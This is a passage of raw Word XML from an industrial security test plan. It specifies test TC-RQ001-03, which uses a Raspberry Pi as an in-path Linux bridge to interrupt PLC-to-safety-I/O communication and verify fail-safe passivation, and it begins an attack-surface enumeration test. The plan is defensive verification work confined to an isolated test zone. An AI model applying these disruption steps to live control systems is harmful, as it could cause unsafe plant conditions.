          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> active injection runs on the </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Pi</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> in isolated Zone-B with the PLC as watchdog — never on the company laptop or production. </w:t>
      </w:r>
      <w:hyperlink r:id="rId22" w:history="1">
        <w:r w:rsidRPr="0006297D">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="0006297D">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>Security_T</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="0006297D">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="0006297D">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>rk_Kali_EN</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="0006297D">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | Word]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="5A77E672" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="0006297D" w:rsidRDefault="0006297D" w:rsidP="0006297D">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="0006297D">
        <w:pict w14:anchorId="4011C312">
          <v:rect id="_x0000_i1357" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="44D08D23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>TC-RQ001-03 — Connection-Disruption → Safe-State Verification (G-1, fail-safe outcome)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FC35CDF" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="0006297D" w:rsidRDefault="0006297D" w:rsidP="0006297D">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0006297D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764"/>
      </w:tblGrid>
      <w:tr w:rsidR="0006297D" w:rsidRPr="0006297D" w14:paraId="0EC211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CE92BB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DFE0DC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Content</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0006297D" w:rsidRPr="0006297D" w14:paraId="082CB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90E59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83457" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="0006297D" w:rsidRDefault="0006297D" w:rsidP="0006297D">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="0006297D">
              <w:t>TC-RQ001-03</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0006297D" w:rsidRPr="00AD42B6" w14:paraId="49291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FAF72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A6A34" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="00AD42B6" w:rsidRDefault="0006297D" w:rsidP="0006297D">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
              <w:rPr>
                <w:lang w:val="fr-FR"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="fr-FR"/>
              </w:rPr>
              <w:t>RQ-001 → CR 3.1 → Asset C, Asset A</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0006297D" w:rsidRPr="00AD42B6" w14:paraId="2D12B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30802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6FDC9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b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Connection-induced communication disruption</w:t>
            </w:r>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (a connected/in-path device withholding the channel)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0006297D" w:rsidRPr="0006297D" w14:paraId="7FE71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26237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 xml:space="preserve">SVV </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0006297D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E9F03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SVV-2</w:t>
            </w:r>
            <w:r w:rsidRPr="0006297D">
              <w:t xml:space="preserve"> (Threat-Mitigation </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0006297D">
              <w:t>Testing</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0006297D">
              <w:t>)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0006297D" w:rsidRPr="00AD42B6" w14:paraId="6D218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A6233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621F4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Verify that when a connecting/in-path device disrupts the black channel longer than </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>F_WD_Time</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">, the device passivates to the </w:t>
            </w:r>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>defined safe state</w:t>
            </w:r>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (outputs Low, qualifier bad) and that re-integration requires acknowledgment — i.e., the connection of a disrupting device </w:t>
            </w:r>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>does not lead to a hazardous situation</w:t>
            </w:r>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0006297D" w:rsidRPr="0006297D" w14:paraId="52E768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206D5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lastRenderedPageBreak/>
              <w:t xml:space="preserve">Abstract </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0006297D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CFF36" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="0006297D" w:rsidRDefault="0006297D" w:rsidP="0006297D">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">1. Reach OPERATE with a known </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>F_WD_Time</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">. 2. Interrupt the safe-comms path for t &gt; </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>F_WD_Time</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">. 3. Measure time-to-safe-state; confirm outputs Low + qualifier bad. 4. </w:t>
            </w:r>
            <w:r w:rsidRPr="0006297D">
              <w:t xml:space="preserve">Restore; </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0006297D">
              <w:t>confirm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no</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0006297D">
              <w:t xml:space="preserve"> auto-</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0006297D">
              <w:t>restart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without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acknowledgment</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0006297D">
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0006297D" w:rsidRPr="00AD42B6" w14:paraId="22890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A0A5A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BDC23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b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>PASS</w:t>
            </w:r>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>iff</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> passivation occurs within the device acknowledgment/response time, outputs = Low, qualifier = bad, and re-integration is gated by acknowledgment. </w:t>
            </w:r>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>FAIL</w:t>
            </w:r>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>iff</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> outputs remain energized past </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>F_WD_Time</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>, or the device auto-re-integrates without acknowledgment.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7D3010E0" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="0006297D" w:rsidRDefault="0006297D" w:rsidP="0006297D">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0006297D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Level 2 — </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0006297D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Concrete</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0006297D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0006297D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06297D" w:rsidRPr="0006297D" w14:paraId="62317A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04616E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1A7CC6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Content</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0006297D" w:rsidRPr="0006297D" w14:paraId="4D7F4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88CFA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Ref</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0006297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525FD" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="0006297D" w:rsidRDefault="0006297D" w:rsidP="0006297D">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="0006297D">
              <w:t>TC-RQ001-03</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0006297D" w:rsidRPr="00AD42B6" w14:paraId="3C314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9925F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120BA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b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>In-path</w:t>
            </w:r>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> bridge: Pi between SPS↔SRIO (temporary re-cabling per Zone-B §10). </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>F_WD_Time</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> e.g. 150 </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>ms.</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> DO wired to PLC input for readback.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0006297D" w:rsidRPr="0006297D" w14:paraId="2C082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F76FE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4BE60" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="0006297D" w:rsidRDefault="0006297D" w:rsidP="0006297D">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="0006297D">
              <w:t xml:space="preserve">Linux </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0006297D">
              <w:t>bridge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utils</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0006297D">
              <w:t xml:space="preserve"> (Pi); Wireshark (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0006297D">
              <w:t>laptop</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0006297D">
              <w:t xml:space="preserve">) </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0006297D">
              <w:t>for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Δt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correlation</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4F344EDB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# TC-RQ001-03 In-path connection-disruption (&gt; </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>F_WD_Time</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24C211CF" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="00AD42B6" w:rsidRDefault="0006297D" w:rsidP="0006297D">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>sudo</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>ip</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> link add br0 type bridge</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4431FB67" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="00AD42B6" w:rsidRDefault="0006297D" w:rsidP="0006297D">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>sudo</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>ip</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> link set eth0 master br0 # towards SPS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C868A04" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="00AD42B6" w:rsidRDefault="0006297D" w:rsidP="0006297D">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>sudo</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>ip</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> link set eth2 master br0 # towards SRIO</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60698EFF" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="00AD42B6" w:rsidRDefault="0006297D" w:rsidP="0006297D">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>sudo</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>ip</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> link set br0 up</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C9FBAC8" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="00AD42B6" w:rsidRDefault="0006297D" w:rsidP="0006297D">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>sudo</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>ip</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> link set br0 down; sleep 1; </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>sudo</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>ip</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> link set br0 up # interrupt &gt; </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>F_WD_Time</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="26CD64F2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| </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Result</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> | ☐ PASS ☐ FAIL — measured </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>t_passivation</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> = ______ </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>ms</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> | | </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Evidence</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> | TC03_wd.pcapng with </w:t>
      </w:r>
      <w:r w:rsidRPr="0006297D">
        <w:t>Δ</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>t cursor, DO=Low trace, FS-LED photo, PLC passivation/acknowledge log |</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30A66D09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b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Scope note:</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> this verifies the </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>fail-safe outcome for a connected device disrupting comms</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">; </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>generalized flooding/DoS resilience is tested under RQ-010 (TC-RQ010-02).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BB1B2EE" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="0006297D" w:rsidRDefault="0006297D" w:rsidP="0006297D">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="0006297D">
        <w:pict w14:anchorId="04755E83">
          <v:rect id="_x0000_i1358" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B2A4B4B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>TC-RQ001-04 — Connecting-Device Reachability / Attack Surface (G-2 evidence)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50977FBF" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="0006297D" w:rsidRDefault="0006297D" w:rsidP="0006297D">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0006297D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7737"/>
      </w:tblGrid>
      <w:tr w:rsidR="0006297D" w:rsidRPr="0006297D" w14:paraId="3889B4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0C93D5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903D3B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Content</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0006297D" w:rsidRPr="0006297D" w14:paraId="5D29B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48207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D022F" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="0006297D" w:rsidRDefault="0006297D" w:rsidP="0006297D">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="0006297D">
              <w:t>TC-RQ001-04</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0006297D" w:rsidRPr="0006297D" w14:paraId="6AB68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0A1F5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20BAC" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="0006297D" w:rsidRDefault="0006297D" w:rsidP="0006297D">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="0006297D">
              <w:t>RQ-001 → CR 3.1 → Asset F</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0006297D" w:rsidRPr="00AD42B6" w14:paraId="224B1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7E4A3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B2AEF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 xml:space="preserve">Spoofing/Tampering </w:t>
            </w:r>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>surface</w:t>
            </w:r>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> a connecting device sees (evidence for G-2)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0006297D" w:rsidRPr="0006297D" w14:paraId="0EDD1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AB1A2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 xml:space="preserve">SVV </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0006297D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D679E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SVV-3</w:t>
            </w:r>
            <w:r w:rsidRPr="0006297D">
              <w:t xml:space="preserve"> (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0006297D">
              <w:t>Vulnerability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Testing</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0006297D">
              <w:t>)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0006297D" w:rsidRPr="00AD42B6" w14:paraId="463F58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2D8C7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32780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>Enumerate the services a connecting device can reach on the non-safety path and compare against the approved matrix, evidencing that RQ-001's residual safety on that path relies on the firewall assumption (SRIO-9402).</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
